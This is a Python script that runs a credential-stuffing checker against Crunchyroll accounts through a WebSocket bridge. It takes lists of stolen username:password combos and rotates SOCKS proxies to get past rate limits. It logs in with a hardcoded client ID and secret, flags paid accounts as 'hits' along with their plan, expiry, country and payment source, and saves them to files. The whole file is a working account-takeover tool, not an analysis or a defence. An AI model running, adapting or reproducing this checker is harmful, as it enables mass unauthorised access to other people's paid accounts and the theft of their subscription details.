import asyncio
import websockets
import json
import threading
import uuid
import requests
import re
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime


# ── Shared state ──────────────────────────────────────────────────────────────
_lock = Lock()
_stop_flag = {"stop": False}
_connected_clients = set()

# ── Country map ───────────────────────────────────────────────────────────────
BRN_MAP = {
    "AF":"Afghanistan","AL":"Albania","DZ":"Algeria","AD":"Andorra","AO":"Angola",
    "AG":"Antigua and Barbuda","AR":"Argentina","AM":"Armenia","AU":"Australia",
    "AT":"Austria","AZ":"Azerbaijan","BS":"Bahamas","BH":"Bahrain","BD":"Bangladesh",
    "BB":"Barbados","BY":"Belarus","BE":"Belgium","BZ":"Belize","BJ":"Benin",
    "BT":"Bhutan","BO":"Bolivia","BA":"Bosnia and Herzegovina","BW":"Botswana",
    "BR":"Brazil","BN":"Brunei","BG":"Bulgaria","BF":"Burkina Faso","BI":"Burundi",
    "KH":"Cambodia","CM":"Cameroon","CA":"Canada","CV":"Cape Verde",
    "CF":"Central African Republic","TD":"Chad","CL":"Chile","CN":"China",
    "CO":"Colombia","KM":"Comoros","CG":"Congo","CD":"DR Congo","CR":"Costa Rica",
    "CI":"Cote d'Ivoire","HR":"Croatia","CU":"Cuba","CW":"Curacao","CY":"Cyprus",
    "CZ":"Czech Republic","DK":"Denmark","DJ":"Djibouti","DM":"Dominica",
    "DO":"Dominican Republic","EC":"Ecuador","EG":"Egypt","SV":"El Salvador",
    "GQ":"Equatorial Guinea","ER":"Eritrea","EE":"Estonia","ET":"Ethiopia",
    "FJ":"Fiji","FI":"Finland","FR":"France","GA":"Gabon","GM":"Gambia",
    "GE":"Georgia","DE":"Germany","GH":"Ghana","GR":"Greece","GD":"Grenada",
    "GT":"Guatemala","GN":"Guinea","GW":"Guinea-Bissau","GY":"Guyana","HT":"Haiti",
    "HN":"Honduras","HK":"Hong Kong","HU":"Hungary","IS":"Iceland","IN":"India",
    "ID":"Indonesia","IR":"Iran","IQ":"Iraq","IE":"Ireland","IL":"Israel",
    "IT":"Italy","JM":"Jamaica","JP":"Japan","JO":"Jordan","KZ":"Kazakhstan",
    "KE":"Kenya","KI":"Kiribati","KP":"North Korea","KR":"South Korea","KW":"Kuwait",
    "KG":"Kyrgyzstan","LA":"Laos","LV":"Latvia","LB":"Lebanon","LS":"Lesotho",
    "LR":"Liberia","LY":"Libya","LI":"Liechtenstein","LT":"Lithuania","LU":"Luxembourg",
    "MO":"Macao","MK":"North Macedonia","MG":"Madagascar","MW":"Malawi",
    "MY":"Malaysia","MV":"Maldives","ML":"Mali","MT":"Malta","MH":"Marshall Islands",
    "MR":"Mauritania","MU":"Mauritius","MX":"Mexico","FM":"Micronesia","MD":"Moldova",
    "MC":"Monaco","MN":"Mongolia","ME":"Montenegro","MA":"Morocco","MZ":"Mozambique",
    "MM":"Myanmar","NA":"Namibia","NR":"Nauru","NP":"Nepal","NL":"Netherlands",
    "NZ":"New Zealand","NI":"Nicaragua","NE":"Niger","NG":"Nigeria","NO":"Norway",
    "OM":"Oman","PK":"Pakistan","PW":"Palau","PS":"Palestine","PA":"Panama",
    "PG":"Papua New Guinea","PY":"Paraguay","PE":"Peru","PH":"Philippines",
    "PL":"Poland","PT":"Portugal","PR":"Puerto Rico","QA":"Qatar","RO":"Romania",
    "RU":"Russia","RW":"Rwanda","SA":"Saudi Arabia","SN":"Senegal","RS":"Serbia",
    "SC":"Seychelles","SL":"Sierra Leone","SG":"Singapore","SK":"Slovakia",
    "SI":"Slovenia","SB":"Solomon Islands","SO":"Somalia","ZA":"South Africa",
    "SS":"South Sudan","ES":"Spain","LK":"Sri Lanka","SD":"Sudan","SR":"Suriname",
    "SZ":"Eswatini","SE":"Sweden","CH":"Switzerland","SY":"Syria","TW":"Taiwan",
    "TJ":"Tajikistan","TZ":"Tanzania","TH":"Thailand","TL":"Timor-Leste","TG":"Togo",
    "TO":"Tonga","TT":"Trinidad and Tobago","TN":"Tunisia","TR":"Turkey",
    "TM":"Turkmenistan","TV":"Tuvalu","UG":"Uganda","UA":"Ukraine","AE":"UAE",
    "GB":"United Kingdom","US":"United States","UY":"Uruguay","UZ":"Uzbekistan",
    "VU":"Vanuatu","VE":"Venezuela","VN":"Vietnam","YE":"Yemen","ZM":"Zambia",
    "ZW":"Zimbabwe",
}

BARO_PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
BRN_CID    = "rjs0ltx0dbwkliwxdzdf"
BRN_SEC    = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
BARON_UA   = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
BARO_WUA   = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
              "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
BRN_API    = "https://beta-api.crunchyroll.com"

# ── Proxy parser ──────────────────────────────────────────────────────────────
def parse_proxy(raw):
    raw = raw.strip()
    if not raw:
        return None
    if raw.startswith(("http://","https://","socks4://","socks5://")):
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            ip, port, user, pw = parts
        else:
            user, pw, ip, port = parts
        return f"socks5://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"socks5://{parts[0]}:{parts[1]}"
    return f"socks5://{raw}"

# ── Core checker (unchanged logic from baron_checker.py) ─────────────────────
def baron_check(baro_user, baro_pw, bron_proxy=None, timeout=20):
    brn_s = requests.Session()
    if bron_proxy:
        brn_s.proxies = {"http": bron_proxy, "https": bron_proxy}
    try:
        baron_did = str(uuid.uuid4())
        baro_anon = str(uuid.uuid4())
        baro_r = brn_s.post(f"{BRN_API}/auth/v1/token", data={
            "grant_type": "password", "username": baro_user, "password": baro_pw,
            "scope": "offline_access", "client_id": BRN_CID, "client_secret": BRN_SEC,
            "device_type": "Google SDK built for x86", "device_id": baron_did,
            "device_name": "sdk_google_atv_x86",
        }, headers={
            "User-Agent": BARON_UA, "Accept": "application/json",
            "Accept-Charset": "UTF-8", "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": baro_anon, "Request-Type": "SignIn",
        }, timeout=timeout)
        brn_src = baro_r.text
        if baro_r.status_code == 429 or "too_many_requests" in brn_src or "rate limited" in brn_src.lower():
            return {"st": "rate"}
        if any(k in brn_src for k in ("invalid_grant","invalid_credentials")) or baro_r.status_code in (401,400):
            return {"st": "bad"}
        try:
            baro_data = baro_r.json()
        except:
            return {"st": "err", "info": f"auth json parse fail ({baro_r.status_code})"}
        brn_tk = baro_data.get("access_token","")
        if not brn_tk:
            return {"st": "err", "info": "no access_token"}

        def hdr():
            return {
                "Authorization": f"Bearer {brn_tk}", "User-Agent": BARO_WUA,
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }

        baro_username = ""
        try:
            r2 = brn_s.get(f"{BRN_API}/accounts/v1/me/multiprofile", headers=hdr(), timeout=timeout)
            m = re.search(r'"username"\s*:\s*"([^"]+)"', r2.text)
            if m: baro_username = m.group(1)
        except: pass

        r3 = brn_s.get(f"{BRN_API}/accounts/v1/me", headers=hdr(), timeout=timeout)
        try:
            acct = r3.json()
        except:
            acct = {}

        ext_id   = acct.get("external_id","")
        verified = acct.get("email_verified", False)
        acct_id  = acct.get("account_id","")
        if not baro_username:
            baro_username = acct.get("username", baro_user.split("@")[0])

        res = {
            "st":"free","user":baro_username,
            "verified":"Yes" if verified else "No",
            "plan":"","sku":"","streams":"",
            "expires":"","renew":"","country":"","payment":"",
        }
        if not ext_id:
            return res

        r4 = brn_s.get(f"{BRN_API}/subs/v1/subscriptions/{ext_id}/benefits", headers=hdr(), timeout=timeout)
        bsrc = r4.text
        nosub = any(x in bsrc for x in (
            "subscription.not_found","Subscription Not Found",'"total":0','"subscription_country":""',
        ))
        if nosub or "concurrent_streams" not in bsrc:
            return res

        res["st"] = "hit"
        sm = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
        if sm:
            res["streams"] = sm.group(1)
            res["plan"] = BARO_PLANS.get(sm.group(1), f"PLAN_{sm.group(1)}")
        cm = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
        if cm:
            res["country"] = BRN_MAP.get(cm.group(1), cm.group(1))
        pm = re.search(r'"source"\s*:\s*"([^"]+)"', bsrc)
        if pm:
            res["payment"] = pm.group(1)

        if acct_id:
            try:
                r5 = brn_s.get(f"{BRN_API}/subs/v3/subscriptions/{acct_id}", headers=hdr(), timeout=timeout)
                s3 = r5.text
                em = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', s3)
                if em: res["expires"] = em.group(1)
                rm = re.search(r'"auto_renew"\s*:\s*(true|false)', s3)
                if rm: res["renew"] = "Yes" if rm.group(1)=="true" else "No"
                skm = re.search(r'"sku"\s*:\s*"([^"]+)"', s3)
                if skm: res["sku"] = skm.group(1)
            except: pass

        return res

    except requests.exceptions.ProxyError:
        return {"st":"err","info":"proxy dead"}
    except requests.exceptions.Timeout:
        return {"st":"err","info":"timeout"}
    except requests.exceptions.ConnectionError:
        return {"st":"err","info":"conn failed"}
    except Exception as e:
        return {"st":"err","info":str(e)[:80]}

def baro_retry(user, pw, proxy, timeout, retries):
    for i in range(retries + 1):
        res = baron_check(user, pw, proxy, timeout)
        if res["st"] != "rate": return res
        if i < retries: time.sleep(4 + random.random() * 3)
    return res

# ── WebSocket broadcast helper ────────────────────────────────────────────────
def broadcast(loop, msg_dict):
    """Thread-safe broadcast to all connected WebSocket clients."""
    msg = json.dumps(msg_dict)
    async def _send():
        dead = set()
        for ws in list(_connected_clients):
            try:
                await ws.send(msg)
            except:
                dead.add(ws)
        _connected_clients.difference_update(dead)
    asyncio.run_coroutine_threadsafe(_send(), loop)

# ── Checker thread ────────────────────────────────────────────────────────────
def run_checker(payload, loop):
    combos   = payload["combos"]      # list of "user:pass"
    proxies  = [parse_proxy(p) for p in payload.get("proxies", []) if p.strip()]
    proxies  = [p for p in proxies if p]
    threads  = int(payload.get("threads", 10))
    timeout  = int(payload.get("timeout", 20))
    retries  = int(payload.get("retries", 2))

    pairs = []
    for line in combos:
        line = line.strip()
        if ":" in line:
            u, p = line.split(":", 1)
            if u.strip() and p.strip():
                pairs.append((u.strip(), p.strip()))

    total = len(pairs)
    if total == 0:
        broadcast(loop, {"type":"error","msg":"No valid combos found."})
        return

    stats = {"hit":0,"free":0,"bad":0,"rate":0,"err":0,"done":0,"total":total}
    broadcast(loop, {"type":"start","total":total,"proxies":len(proxies)})

    # Output files
    os.makedirs("output", exist_ok=True)
    tag = datetime.now().strftime("%H%M%S")
    f_hits = open(f"output/cr_hits_{tag}.txt","a",encoding="utf-8")
    f_free = open(f"output/cr_free_{tag}.txt","a",encoding="utf-8")

    px_idx = [0]
    px_lock = Lock()
    def next_proxy():
        if not proxies: return None
        with px_lock:
            p = proxies[px_idx[0] % len(proxies)]
            px_idx[0] += 1
            return p

    _stop_flag["stop"] = False

    try:
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = {
                pool.submit(baro_retry, u, p, next_proxy(), timeout, retries): (u, p)
                for u, p in pairs
            }
            for fut in as_completed(futs):
                if _stop_flag["stop"]:
                    pool.shutdown(wait=False, cancel_futures=True)
                    break

                u, p = futs[fut]
                combo = f"{u}:{p}"
                try:
                    res = fut.result()
                except Exception as e:
                    res = {"st":"err","info":str(e)[:60]}

                st = res["st"]
                with _lock:
                    stats["done"] += 1
                    stats[st] = stats.get(st, 0) + 1

                msg = {
                    "type": "result",
                    "st": st,
                    "combo": combo,
                    "stats": dict(stats),
                }

                if st == "hit":
                    detail = (f"User:{res['user']} | Plan:{res['plan']} | "
                              f"Exp:{res.get('expires','?')} | Renew:{res.get('renew','?')} | "
                              f"Streams:{res.get('streams','?')} | Country:{res.get('country','?')} | "
                              f"Payment:{res.get('payment','?')}")
                    msg["detail"] = detail
                    msg["hit_data"] = res
                    f_hits.write(f"{combo} | {detail}\n"); f_hits.flush()

                elif st == "free":
                    detail = f"User:{res['user']} | Verified:{res.get('verified','?')}"
                    msg["detail"] = detail
                    f_free.write(f"{combo} | {detail}\n"); f_free.flush()

                elif st in ("err","rate"):
                    msg["detail"] = res.get("info","")

                broadcast(loop, msg)

    finally:
        f_hits.close(); f_free.close()
        broadcast(loop, {"type":"done","stats":stats,"stopped":_stop_flag["stop"]})

# ── WebSocket handler ─────────────────────────────────────────────────────────
async def handler(websocket):
    _connected_clients.add(websocket)
    loop = asyncio.get_event_loop()
    print(f"[WS] Client connected ({len(_connected_clients)} total)")
    try:
        async for raw in websocket:
            try:
                msg = json.loads(raw)
            except:
                continue
            action = msg.get("action")

            if action == "start":
                t = threading.Thread(target=run_checker, args=(msg, loop), daemon=True)
                t.start()

            elif action == "stop":
                _stop_flag["stop"] = True
                print("[WS] Stop requested")

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        _connected_clients.discard(websocket)
        print(f"[WS] Client disconnected ({len(_connected_clients)} total)")

# ── Entry point ───────────────────────────────────────────────────────────────
import os
PORT = int(os.environ.get("PORT", 8765))

async def main():
    print(f"Bridge running on port {PORT}")
    async with websockets.serve(handler, "0.0.0.0", PORT):
        await asyncio.Future()
        await asyncio.Future()  # run forever

if __name__ == "__main__":
    asyncio.run(main())